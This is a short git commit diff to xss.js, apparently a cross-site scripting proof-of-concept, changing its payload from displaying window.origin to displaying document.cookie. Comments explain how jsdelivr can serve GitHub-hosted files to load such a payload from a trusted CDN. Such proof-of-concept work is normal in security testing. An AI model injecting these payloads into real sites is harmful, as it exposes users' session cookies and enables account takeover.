ae677de2bc8e7611f7decd2a9d37dc164610943e
lmaohahaxd <v40730627@gmail.com>
2025-08-01 17:00:33 +0800

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,4 +1,4 @@
-prompt(window.origin)
+prompt(document.cookie)
 // https://cdn.jsdelivr.net/ will allow you to proxy any file on github.com
 // https://cdn.jsdelivr.net/gh/<username>/<project>/<filename>
 // https://cdn.jsdelivr.net/gh/renniepak/xss/xss.js
